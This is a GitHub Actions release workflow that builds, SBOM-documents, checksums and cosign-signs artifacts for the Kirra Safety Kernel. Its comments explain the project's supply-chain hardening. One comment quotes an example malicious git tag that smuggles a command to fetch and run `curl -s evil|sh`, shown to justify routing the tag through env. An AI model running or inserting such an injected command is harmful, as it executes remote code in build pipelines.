# .github/workflows/release.yml
#
# Automated release builds for Kirra Safety Kernel.
# Triggers on git tag push matching v* (e.g. v1.0.0, v1.2.3-rc1).
#
# Usage:
#   git tag v1.0.0
#   git push origin v1.0.0
#
# This workflow:
#   1. Builds the React dashboard (once, shared across all platform builds)
#   2. Builds binaries for x86_64, aarch64, and armv7 (Linux, musl static)
#   3. Packages each as a .tar.gz with dashboard, install.sh and INSTALL.md
#   4. Generates a CycloneDX SBOM for the shipped binaries (WS-0.6)
#   5. Generates SHA256 checksums
#   6. Signs every artifact with cosign (keyless, GitHub OIDC — WS-0.6)
#   7. Creates a GitHub Release with artifacts + SBOM + signature bundles

name: Release

on:
  push:
    tags:
      - 'v*'

# #775 F1 — least-privilege by default. The workflow-level grant is READ ONLY;
# the OIDC signing identity (`id-token: write`) and release-write scope are
# granted PER-JOB, to the `release` job only. Previously these were workflow-wide,
# so every job — including `build-dashboard` (npm) and `build` (build scripts,
# `cross`) — could mint the release-signing OIDC token from any `run` step and
# `cosign sign-blob` arbitrary blobs under the release identity. Now only the job
# that actually signs holds the token.
permissions:
  contents: read

jobs:
  # #776 F1 + F4 — PREFLIGHT: fail fast BEFORE any build/SBOM/signing runs.
  # Previously the tag↔manifest version consistency was policy-only (a `v9.9.9`
  # tag on a 1.1.2 tree released self-contradictory SIGNED artifacts), and the
  # changelog gate fired LAST — after three cross-compiles, the SBOM, AND cosign
  # had already written signatures to the public Rekor log for a release that
  # then aborted. This job checks both in seconds with no toolchain and no build,
  # so a bad tag never reaches the signing identity.
  preflight:
    name: Preflight (tag ↔ version, changelog)
    runs-on: ubuntu-latest
    permissions:
      contents: read
    env:
      # #775 F5 — route the tag through env so it reaches the shell as DATA, not
      # interpolated into the script text. Refnames forbid `\` and `[` but ALLOW
      # `$ ( ) ; ' " ` &`, so a tag like `v1";curl -s evil|sh;"` interpolated into
      # a `run:` block would execute; as `"$VERSION"` it cannot.
      VERSION: ${{ github.ref_name }}
    steps:
      - name: Checkout
        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7

      - name: Tag must equal the root Cargo.toml version (#776 F1)
        run: |
          MANIFEST_V=$(awk -F'"' '/^\[package\]/{p=1} p&&/^version[[:space:]]*=/{print $2; exit}' Cargo.toml)
          if [ -z "$MANIFEST_V" ]; then
            echo "::error::could not parse the [package] version from Cargo.toml"
            exit 1
          fi
          if [ "v${MANIFEST_V}" != "$VERSION" ]; then
            echo "::error::tag $VERSION does not match the root Cargo.toml version v${MANIFEST_V} —" \
                 "the tag MUST equal the manifest version (docs/VERSIONING_POLICY.md). Fix one and re-tag."
            exit 1
          fi
          echo "OK: tag $VERSION == Cargo.toml v${MANIFEST_V}"

      - name: Changelog section must exist for this tag (#776 F4)
        run: |
          if [ ! -f CHANGELOG.md ]; then
            echo "::error::CHANGELOG.md is missing — a release must ship real notes (WS-0.7)."
            exit 1
          fi
          # Same exact-prefix bracketed-heading match as the release job's
          # extractor (the version is compared as a STRING, never a regex).
          awk -v ver="$VERSION" '
            /^## / { want = "## [" ver "]"; flag = (substr($0, 1, length(want)) == want); next }
            flag' CHANGELOG.md > /tmp/notes_check.md
          if [ ! -s /tmp/notes_check.md ]; then
            echo "::error file=CHANGELOG.md::No '## [$VERSION]' section in CHANGELOG.md — a release must" \
                 "ship real notes (WS-0.7). Add the section (rename [Unreleased]), then cut the NEXT patch" \
                 "version and tag that. Do NOT delete/re-push a tag: keyless signing would leave conflicting" \
                 "Rekor entries for one identity."
            exit 1
          fi
          echo "OK: CHANGELOG.md has a '## [$VERSION]' section"

  build-dashboard:
    name: Build dashboard
    needs: preflight
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Checkout
        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7

      - name: Set up Node.js
        uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6
        with:
          node-version: '20'

      - name: Build dashboard
        # #775 F1 — `npm ci` (not `npm install`): install exactly the committed
        # package-lock.json, deterministically, instead of re-resolving at build
        # time. (Postinstall scripts still run, but this job no longer holds the
        # OIDC signing token — see the per-job permissions above.)
        run: cd dashboard && npm ci && npm run build

      - name: Generate dashboard npm SBOM (CycloneDX)
        # #798 F6 — the dashboard/dist bundle ships in EVERY tarball but had
        # no SBOM. `npm sbom` (built into npm ≥9.5 — no extra unpinned tool)
        # reads the tree `npm ci` just installed from the committed lockfile;
        # --omit dev scopes it to what actually ships.
        env:
          VERSION: ${{ github.ref_name }}  # #775 F5 — tag as data
        run: |
          cd dashboard
          npm sbom --sbom-format cyclonedx --omit dev \
            > "../kirra-${VERSION}-dashboard-npm.cdx.json"
          if [ ! -s "../kirra-${VERSION}-dashboard-npm.cdx.json" ]; then
            echo "::error::npm sbom produced an empty dashboard SBOM"
            exit 1
          fi

      - name: Upload dashboard artifact
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
        with:
          name: kirra-dashboard-dist
          path: dashboard/dist/
          retention-days: 1

      - name: Upload dashboard SBOM
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
        with:
          name: kirra-sbom-npm
          path: kirra-*.cdx.json
          retention-days: 1

  build:
    name: Build ${{ matrix.target_name }}
    needs: [preflight, build-dashboard]
    runs-on: ubuntu-latest
    permissions:
      contents: read
    env:
      VERSION: ${{ github.ref_name }}  # #775 F5 — tag as data, not interpolated script
    strategy:
      matrix:
        include:
          - target: x86_64-unknown-linux-musl
            target_name: x86_64-linux
            cross: false

          - target: aarch64-unknown-linux-musl
            target_name: aarch64-linux
            cross: true

          - target: armv7-unknown-linux-musleabihf
            target_name: armv7-linux
            cross: true

    steps:
      - name: Checkout
        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7

      - name: Install Rust toolchain
        uses: dtolnay/rust-toolchain@4be7066ada62dd38de10e7b70166bc74ed198c30 # stable
        with:
          targets: ${{ matrix.target }}

      - name: Install cross (for ARM targets)
        if: matrix.cross
        # #775 F1 — install `cross` from the crates.io REGISTRY at a pinned
        # version + `--locked` (was: unpinned `--git` HEAD — whatever upstream
        # main was at run time, with its build scripts executing in the release
        # pipeline). Registry install is checksummed and covered by the cargo-deny
        # supply-chain gate; it keeps no git/tag-resolution dependency in the build.
        run: cargo install cross --version 0.2.5 --locked

      - name: Build kirra_verifier_service
        run: |
          if [ "${{ matrix.cross }}" = "true" ]; then
            cross build --release --target ${{ matrix.target }} --bin kirra_verifier_service
          else
            # x86_64 musl needs musl-tools
            sudo apt-get install -y musl-tools
            cargo build --release --target ${{ matrix.target }} --bin kirra_verifier_service
          fi

      - name: Build kirra_carla_client
        run: |
          if [ "${{ matrix.cross }}" = "true" ]; then
            cross build --release --target ${{ matrix.target }} --bin kirra_carla_client
          else
            cargo build --release --target ${{ matrix.target }} --bin kirra_carla_client
          fi

      - name: Download dashboard
        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8
        with:
          name: kirra-dashboard-dist
          path: dashboard-dist/

      - name: Package release
        run: |
          # $VERSION from job env (#775 F5). Matrix values are workflow-defined
          # (not attacker-controllable), so interpolating them is safe.
          TARGET_NAME="${{ matrix.target_name }}"
          TARGET="${{ matrix.target }}"
          ARCHIVE_NAME="kirra-${VERSION}-${TARGET_NAME}.tar.gz"

          # Create staging layout
          mkdir -p staging/kirra staging/systemd staging/dashboard

          # Binaries
          cp "target/${TARGET}/release/kirra_verifier_service" staging/kirra/
          cp "target/${TARGET}/release/kirra_carla_client"     staging/kirra/
          chmod 755 staging/kirra/*

          # Dashboard
          cp -r dashboard-dist/. staging/dashboard/

          # Supporting files
          cp install.sh     staging/
          cp INSTALL.md     staging/
          cp README.md      staging/ 2>/dev/null || true
          # #790 F7 — the licence is REQUIRED in every tarball. No `|| true`: a
          # missing licence is a packaging failure, not something to swallow. The
          # repo's licence file is COPYRIGHT (there is no LICENSE).
          cp COPYRIGHT      staging/
          cp scripts/kirra-verifier.service   staging/systemd/
          cp scripts/kirra-dashboard.service  staging/systemd/
          echo "${VERSION}" > staging/VERSION

          # Create archive — #790 F2 deterministic tar+gzip (sorted names, fixed
          # mtime/owner, gzip -n) so the tarball bytes are a function of the content,
          # not of build timestamps.
          tar --sort=name --mtime='UTC 2020-01-01' --owner=0 --group=0 --numeric-owner \
              -cf - -C staging . | gzip -n > "${ARCHIVE_NAME}"
          echo "ARCHIVE_NAME=${ARCHIVE_NAME}" >> "${GITHUB_ENV}"

      # WS-0.6 / #798 F5 — CycloneDX SBOMs, generated INSIDE the build matrix
      # with `--target` so each SBOM describes the dependency graph of the
      # binary actually shipped for that triple. The previous standalone job
      # resolved on the HOST (no --target): target-conditional dep arms
      # (getrandom/libc/nix, per-arch crypto backends, gnu-vs-musl) made that
      # an approximation — verified concretely: the x86_64-musl and
      # aarch64-musl graphs differ (curve25519-dalek-derive is x86_64-only).
      # Each SBOM records its triple as the `kirra:cargo:target` property;
      # the release job asserts count == bins × targets and per-file triple.
      - name: Install cargo-cyclonedx
        # #775 F1/F10 — pin the tool version (was: unpinned; an upstream naming
        # or behaviour change would silently alter the release SBOM).
        run: cargo install cargo-cyclonedx --version 0.5.9 --locked

      - name: Generate per-target SBOMs (CycloneDX)
        run: |
          # $VERSION from job env (#775 F5); matrix values are workflow-defined.
          TARGET="${{ matrix.target }}"
          # `--describe binaries` emits one SBOM per workspace binary from the
          # committed lockfile (what the build above actually built); the
          # release ships exactly two, both from the root crate.
          cargo cyclonedx --describe binaries --format json --spec-version 1.5 \
            --target "${TARGET}" -q
          for bin in kirra_verifier_service kirra_carla_client; do
            src="./${bin}_bin.cdx.json"
            if [ ! -s "${src}" ]; then
              echo "::error::cargo-cyclonedx produced no SBOM for ${bin} (${TARGET})"
              exit 1
            fi
            # Record the triple IN the SBOM (self-identifying beyond the
            # filename); the release job cross-checks this against the name.
            jq --arg t "${TARGET}" \
              '.metadata.properties = ((.metadata.properties // []) + [{"name":"kirra:cargo:target","value":$t}])' \
              "${src}" > "kirra-${VERSION}-${bin}-${TARGET}.cdx.json"
          done
          # Trial outputs for non-shipped workspace binaries are not release
          # artifacts — drop them so the upload glob can't pick one up.
          find . -name '*_bin.cdx.json' -delete
          ls -l ./kirra-*.cdx.json

      - name: Upload artifact
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
        with:
          name: kirra-${{ matrix.target_name }}
          path: |
            kirra-*.tar.gz
            kirra-*.cdx.json
          retention-days: 1

  # EP-18 — the safety-case-as-code bundle: reviewed evidence manifests +
  # safety-case documents + gates RE-EXECUTED at bundle time (safety-constant
  # provenance match, quality ratchet, frozen-talisman blob pin) + referenced
  # CI lanes, assembled into one hash-chained, SELF-VERIFYING bundle
  # (ci/build_safety_case.py). Tarred as kirra-<version>-safety-case.tar.gz so
  # the release job's existing *.tar.gz handling carries it into SHA256SUMS and
  # the keyless cosign signing, exactly like the platform tarballs.
  safety-case:
    name: Safety-case evidence bundle (EP-18)
    needs: preflight
    runs-on: ubuntu-latest
    permissions:
      contents: read
    env:
      VERSION: ${{ github.ref_name }}
    steps:
      - name: Checkout
        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7

      - name: Build + self-verify the bundle
        run: make safety-case

      - name: Tar the bundle (version-prefixed, self-identifying)
        run: |
          tar -C target -czf "kirra-${VERSION}-safety-case.tar.gz" safety-case
          ls -l kirra-*-safety-case.tar.gz

      - name: Upload safety-case artifact
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
        with:
          name: kirra-safety-case
          path: kirra-*-safety-case.tar.gz
          retention-days: 1

  # WS-5.1 — the QNX governor-judge artifact: the no_std core-only verdict
  # staticlib for both QNX 8.0 tuples, tarred with its ABI header and
  # provenance manifest. Named kirra-<version>-qnx800-judge.tar.gz so the
  # release job's existing *.tar.gz handling carries it into SHA256SUMS and
  # the keyless cosign signing — the artifact enters the supply-chain trust
  # chain like every platform tarball. Functional artifact only: timing/WCET
  # evidence is QNX-target-only (PROVENANCE.txt states this).
  qnx-artifact:
    name: QNX governor-judge artifact
    needs: preflight
    runs-on: ubuntu-latest
    timeout-minutes: 20  # #790 F9
    permissions:
      contents: read
    env:
      VERSION: ${{ github.ref_name }}  # #775 F5
    steps:
      - name: Checkout
        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7

      # #790 F5 — PIN the compiler: the signed judge core must be built by the SAME
      # explicit toolchain the PR CI lane proves (see ci.yml). A floating `stable`
      # could rename the nto-qnx800 tuples or change -Zbuild-std syntax on any
      # release day. Recorded in the artifact PROVENANCE.txt.
      - name: Install Rust toolchain (+rust-src for -Zbuild-std)
        uses: dtolnay/rust-toolchain@4be7066ada62dd38de10e7b70166bc74ed198c30 # stable
        with:
          toolchain: "1.94.1"
          components: rust-src

      - name: Build the judge staticlibs
        run: scripts/build_qnx_judge_artifact.sh dist-qnx

      # #790 F2 — reproducibility gate BEFORE this artifact enters the SHA256SUMS +
      # cosign chain: rebuild and byte-compare the staticlibs (PROVENANCE.txt is
      # excluded — it intentionally records the ci-run id). A non-deterministic
      # verdict core must never be signed.
      - name: Reproducibility (double-build cmp)
        run: |
          scripts/build_qnx_judge_artifact.sh dist-qnx-2
          rc=0
          for a in dist-qnx/libkirra_judge-*.a; do
            b="dist-qnx-2/$(basename "$a")"
            cmp -s "$a" "$b" && echo "reproducible: $(basename "$a")" \
              || { echo "::error::non-reproducible staticlib: $(basename "$a")"; rc=1; }
          done
          cmp -s dist-qnx/kirra_ffi.h dist-qnx-2/kirra_ffi.h || { echo "::error::kirra_ffi.h differs"; rc=1; }
          exit $rc

      - name: Package
        run: |
          # $VERSION from job env (#775 F5). #790 F2 — deterministic tar+gzip.
          tar --sort=name --mtime='UTC 2020-01-01' --owner=0 --group=0 --numeric-owner \
              -cf - -C dist-qnx . | gzip -n > "kirra-${VERSION}-qnx800-judge.tar.gz"

      - name: Upload artifact
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
        with:
          name: kirra-qnx800-judge
          path: kirra-*-qnx800-judge.tar.gz
          retention-days: 1

  release:
    name: Create GitHub Release
    needs: [build, build-dashboard, qnx-artifact, safety-case]
    runs-on: ubuntu-latest
    # #798 F7 — the signing job runs in a GitHub Environment so the OIDC
    # signing identity can be put behind REQUIRED REVIEWERS: a pushed tag then
    # builds everything but cannot SIGN or publish until a human approves the
    # deployment. The protection rules are repo settings (owner action, not
    # code) — see docs/releases/SUPPLY_CHAIN_OWNER_ACTIONS.md. Referencing the
    # environment here is safe before that: an unconfigured environment is
    # created on first run with no rules (current behavior unchanged).
    environment: release
    # #775 F1 — the ONLY job granted the OIDC signing identity + release-write.
    # It runs no third-party build scripts (checkout, download, checksum, cosign,
    # gh-release), so the token is not exposed to untrusted code.
    permissions:
      contents: write  # create the GitHub release
      id-token: write  # keyless cosign signing (GitHub OIDC identity)
    env:
      # #775 F5 — the signing job routes the tag through env (data, not
      # interpolated script), the highest-value place to close the injection
      # surface since this is the job that holds the OIDC token.
      VERSION: ${{ github.ref_name }}
    steps:
      - name: Checkout
        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7

      - name: Download all artifacts
        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8
        with:
          path: dist
          merge-multiple: true

      - name: Assert SBOM completeness (#798 F5/F6)
        # The SBOM set must be ARTIFACT-ACCURATE before anything is signed:
        # one SBOM per (shipped bin × target), each recording the triple it
        # was resolved for, plus the dashboard npm bundle. A missing or
        # mislabeled SBOM fails the release here — before the signing step —
        # so an approximate SBOM can never enter the trust chain again.
        run: |
          cd dist
          fail=0
          for target in x86_64-unknown-linux-musl aarch64-unknown-linux-musl armv7-unknown-linux-musleabihf; do
            for bin in kirra_verifier_service kirra_carla_client; do
              f="kirra-${VERSION}-${bin}-${target}.cdx.json"
              if [ ! -s "$f" ]; then
                echo "::error::missing SBOM: $f"; fail=1; continue
              fi
              rec=$(jq -r '.metadata.properties[]? | select(.name=="kirra:cargo:target") | .value' "$f")
              if [ "$rec" != "$target" ]; then
                echo "::error::$f records target '$rec' (expected '$target')"; fail=1
              fi
            done
          done
          if [ ! -s "kirra-${VERSION}-dashboard-npm.cdx.json" ]; then
            echo "::error::missing dashboard npm SBOM"; fail=1
          fi
          count=$(find . -maxdepth 1 -name '*.cdx.json' | wc -l)
          if [ "$count" -ne 7 ]; then
            echo "::error::expected exactly 7 SBOMs (2 bins x 3 targets + dashboard), found $count:"
            ls ./*.cdx.json || true
            fail=1
          fi
          [ "$fail" -eq 0 ] && echo "OK: SBOM set complete and target-accurate (7/7)"
          exit "$fail"

      - name: Generate checksums
        run: |
          cd dist
          sha256sum *.tar.gz *.cdx.json > SHA256SUMS
          cat SHA256SUMS

      # WS-0.6 — keyless cosign signatures over every release artifact.
      # The signing identity is this workflow's GitHub OIDC identity (repo +
      # workflow path + tag ref), recorded in the public Rekor transparency
      # log; each artifact gets a self-contained .cosign.bundle (signature +
      # certificate + Rekor proof) that verifies OFFLINE against the pinned
      # identity — no key management, nothing to leak.
      - name: Install cosign
        uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6 # v4.1.2

      - name: Sign release artifacts (keyless, GitHub OIDC)
        run: |
          cd dist
          for f in *.tar.gz *.cdx.json SHA256SUMS; do
            cosign sign-blob --yes --bundle "${f}.cosign.bundle" "${f}"
          done
          ls -l ./*.cosign.bundle

      - name: Extract changelog for this version
        id: changelog
        run: |
          # `$VERSION` comes from the job-level env (#775 F5). Preflight already
          # validated the section exists; this re-extracts it for the release body.
          # WS-0.7: the changelog section is REQUIRED. Extract the section
          # whose heading names the pushed tag; a missing/empty section
          # FAILS the release — no more "Release vX" fallback notes.
          #
          # Exact-prefix match on the BRACKETED heading ("## [vX.Y.Z]") —
          # the version is compared as a STRING, never interpolated into a
          # regex, so dots can't wildcard and "v1.1.2" can't match a
          # "v1.1.21" section (the closing bracket bounds it).
          if [ ! -f CHANGELOG.md ]; then
            echo "::error::CHANGELOG.md is missing — a release must ship real notes (WS-0.7)."
            exit 1
          fi
          awk -v ver="${VERSION}" '
            /^## / { want = "## [" ver "]"; flag = (substr($0, 1, length(want)) == want); next }
            flag' CHANGELOG.md > release_notes.md
          if [ ! -s release_notes.md ]; then
            echo "::error file=CHANGELOG.md::No '## [${VERSION}]' section found in CHANGELOG.md —" \
                 "a release must ship real notes (WS-0.7). Add the section (rename [Unreleased])," \
                 "then delete and re-push the tag."
            exit 1
          fi
          # WS-0.6: verification instructions travel with every release.
          # #798 F7 — EXACT identity, interpolated per release (the notes are
          # generated per-release, so nothing is lost by being exact). The old
          # `@refs/tags/.*` regexp accepted a signature from ANY tag build —
          # including a malicious tag pushed by any writer — as valid for any
          # artifact. The heredoc stays quoted (no shell interpolation near
          # the signing job); the version is substituted as data by sed below.
          cat >> release_notes.md <<'VERIFY'

          ---
          ### Verify artifact signatures (cosign, keyless)

          Every artifact (tarballs, SBOMs, `SHA256SUMS`) carries a
          `.cosign.bundle` — signature + signing certificate + transparency-log
          proof, verifiable offline. The identity below is EXACT for this
          release: a signature minted by any other tag, branch, or workflow
          does not verify.

          ```sh
          cosign verify-blob \
            --bundle <artifact>.cosign.bundle \
            --certificate-identity \
              'https://github.com/kirra-systems/kirra-runtime-sdk/.github/workflows/release.yml@refs/tags/@VERSION@' \
            --certificate-oidc-issuer https://token.actions.githubusercontent.com \
            <artifact>
          ```

          The `kirra-@VERSION@-<bin>-<target-triple>.cdx.json` files are
          per-target CycloneDX SBOMs — one per shipped binary per platform,
          resolved with `--target` so each describes the dependency graph of
          the binary it sits next to (the triple is also recorded inside each
          SBOM as the `kirra:cargo:target` property).
          `kirra-@VERSION@-dashboard-npm.cdx.json` covers the bundled
          dashboard's npm runtime dependencies.
          VERIFY
          # $VERSION is preflight-validated (== the Cargo.toml version), so it
          # is plain vX.Y.Z[-rc...] data — substituted with a non-/ delimiter.
          sed -i "s|@VERSION@|${VERSION}|g" release_notes.md

      - name: Create GitHub Release
        uses: softprops/action-gh-release@3d0d9888cb7fd7b750713d6e236d1fcb99157228 # v3
        with:
          name: Kirra ${{ github.ref_name }}
          body_path: release_notes.md
          files: |
            dist/*.tar.gz
            dist/*.cdx.json
            dist/SHA256SUMS
            dist/*.cosign.bundle
          draft: false
